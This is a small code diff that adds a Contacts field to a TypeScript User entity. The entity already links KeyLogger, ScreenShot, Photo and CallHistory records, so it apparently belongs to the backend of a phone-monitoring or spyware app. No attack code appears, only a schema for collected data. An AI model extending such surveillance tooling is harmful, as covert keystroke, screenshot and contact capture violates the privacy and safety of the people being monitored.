@@ -18,6 +18,7 @@ import { KeyLogger } from './KeyLogger';
 import { ScreenShot } from './ScreenShot';
 import { Photo } from './Photo';
 import { CallHistory } from './CallHistory';
+import { Contacts } from './Contacts';
 
 @Entity()
 export class User {
@@ -81,6 +82,9 @@ export class User {
 
     @Column(type => CallHistory)
     public callHistoryList: CallHistory[];
+
+    @Column(type => Contacts)
+    public contacts: Contacts[];
 
     public toString(): string {
         return `${this.email}`;
